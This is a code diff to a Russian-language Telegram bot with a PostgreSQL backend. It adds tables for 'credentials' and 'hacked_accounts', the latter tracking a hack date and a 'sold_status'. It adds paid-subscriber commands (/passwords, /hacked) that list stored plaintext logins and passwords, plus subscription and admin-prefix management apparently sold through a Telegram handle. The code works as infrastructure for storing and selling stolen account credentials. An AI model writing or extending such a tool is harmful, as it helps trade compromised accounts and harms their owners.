@@ -40,7 +40,13 @@ def init_db():
         print("Creating table 'users' if not exists")
         c.execute('''CREATE TABLE IF NOT EXISTS users 
                      (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
-        subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()  # 10 років
+        print("Creating table 'credentials' if not exists")
+        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
+                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
+        print("Creating table 'hacked_accounts' if not exists")
+        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
+                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
+        subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
         print(f"Ensuring Создатель for {ADMIN_CHAT_ID}")
         c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                   "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
@@ -98,6 +104,57 @@ def get_user(chat_id):
         conn.close()
         return None
 
+def save_user(chat_id, prefix, subscription_end):
+    conn = get_db_connection()
+    if conn is None:
+        print(f"Failed to save user {chat_id}: no DB connection")
+        return
+    try:
+        c = conn.cursor()
+        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
+                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
+                  (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
+        conn.commit()
+        conn.close()
+        print(f"User {chat_id} saved with prefix {prefix}")
+    except Exception as e:
+        print(f"Error saving user {chat_id}: {e}")
+        conn.close()
+
+def get_credentials():
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to get credentials: no DB connection")
+        return []
+    try:
+        c = conn.cursor()
+        c.execute("SELECT login, password, added_time FROM credentials")
+        result = c.fetchall()
+        conn.close()
+        print(f"Credentials fetched: {result}")
+        return result
+    except Exception as e:
+        print(f"Error fetching credentials: {e}")
+        conn.close()
+        return []
+
+def get_hacked_accounts():
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to get hacked accounts: no DB connection")
+        return []
+    try:
+        c = conn.cursor()
+        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
+        result = c.fetchall()
+        conn.close()
+        print(f"Hacked accounts fetched: {result}")
+        return result
+    except Exception as e:
+        print(f"Error fetching hacked accounts: {e}")
+        conn.close()
+        return []
+
 # === Перевірка доступу ===
 def check_access(chat_id, command):
     global tech_break
@@ -109,7 +166,12 @@ def check_access(chat_id, command):
     user = get_user(chat_id)
     if not user or user['prefix'] == 'Посетитель':
         return "🔒 Вы можете купить подписку у @sacoectasy."
-    if command in ['techstop'] and user['prefix'] != 'Создатель':
+    if user['subscription_end'] and user['subscription_end'] < datetime.now():
+        save_user(chat_id, 'Посетитель', datetime.now())
+        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy."
+    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
+        return "🔒 Доступно только для Админа и Создателя!"
+    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
         return "🔒 Доступно только для Создателя!"
     print(f"Access granted for {chat_id} on {command}")
     return None
@@ -191,7 +253,11 @@ def menu_cmd(message):
     if user:
         time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
         time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
-        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop"
+        response = (f"👤 Ваш префикс: {user['prefix']}\n"
+                    f"⏳ Подписка: {time_str}\n\n"
+                    f"🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop\n/techstopoff"
+                    f"{'' if user['prefix'] not in ['Админ', 'Создатель'] else '\n/passwords\n/admin'}"
+                    f"{'' if user['prefix'] != 'Создатель' else '\n/hacked\n/database\n/adprefix\n/delprefix'}")
     else:
         response = "🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
     bot.reply_to(message, response)
@@ -232,8 +298,123 @@ def techstop_cmd(message):
         bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
         return
     minutes = int(args[0])
-    tech_break = datetime.now() + timedelta(minutes=minutes)
-    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')}")
+    tech_break = datetime.now() + timedelta(minutes=minutes, hours=2)  # +2 часа для часового пояса
+    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')} (UTC+2)")
+
+@bot.message_handler(commands=['techstopoff'])
+def techstopoff_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /techstopoff for chat_id: {chat_id}")
+    access = check_access(chat_id, 'techstopoff')
+    if access:
+        bot.reply_to(message, access)
+        return
+    global tech_break
+    tech_break = None
+    bot.reply_to(message, "✅ Техперерыв отключен.")
+
+@bot.message_handler(commands=['passwords'])
+def passwords_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /passwords for chat_id: {chat_id}")
+    access = check_access(chat_id, 'passwords')
+    if access:
+        bot.reply_to(message, access)
+        return
+    credentials = get_credentials()
+    if not credentials:
+        bot.reply_to(message, "📂 Список паролей пуст.")
+        return
+    response = "🔑 Список паролей:\n"
+    for login, password, added_time in credentials:
+        response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['hacked'])
+def hacked_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /hacked for chat_id: {chat_id}")
+    access = check_access(chat_id, 'hacked')
+    if access:
+        bot.reply_to(message, access)
+        return
+    hacked_accounts = get_hacked_accounts()
+    if not hacked_accounts:
+        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.")
+        return
+    response = "🔓 Взломанные аккаунты:\n"
+    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
+        response += (f"Логин: {login} | Пароль: {password} | Дата: {hack_date} | "
+                     f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['database'])
+def database_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /database for chat_id: {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.reply_to(message, access)
+        return
+    conn = get_db_connection()
+    if conn is None:
+        bot.reply_to(message, "❌ Не удалось подключиться к базе данных.")
+        return
+    try:
+        c = conn.cursor()
+        c.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")
+        tables = c.fetchall()
+        conn.close()
+        response = "📊 Таблицы в базе:\n" + "\n".join(table[0] for table in tables)
+        bot.reply_to(message, response)
+    except Exception as e:
+        print(f"Error in /database: {e}")
+        conn.close()
+        bot.reply_to(message, "❌ Ошибка при запросе к базе.")
+
+@bot.message_handler(commands=['admin'])
+def admin_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /admin for chat_id: {chat_id}")
+    access = check_access(chat_id, 'admin')
+    if access:
+        bot.reply_to(message, access)
+        return
+    bot.reply_to(message, "👑 Панель администратора:\nСкоро тут будут функции!")
+
+@bot.message_handler(commands=['adprefix'])
+def adprefix_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /adprefix for chat_id: {chat_id}")
+    access = check_access(chat_id, 'adprefix')
+    if access:
+        bot.reply_to(message, access)
+        return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
+    if len(args) < 2 or not args[1].isdigit():
+        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <дни>")
+        return
+    target_chat_id = args[0]
+    days = int(args[1])
+    subscription_end = datetime.now() + timedelta(days=days)
+    save_user(target_chat_id, "Админ", subscription_end)
+    bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс Админ на {days} дней.")
+
+@bot.message_handler(commands=['delprefix'])
+def delprefix_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /delprefix for chat_id: {chat_id}")
+    access = check_access(chat_id, 'delprefix')
+    if access:
+        bot.reply_to(message, access)
+        return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
+    if not args:
+        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
+        return
+    target_chat_id = args[0]
+    save_user(target_chat_id, "Посетитель", datetime.now())
+    bot.reply_to(message, f"✅ Префикс пользователя {target_chat_id} сброшен до Посетитель.")
 
 init_db()  # Ініціалізація при запуску
 
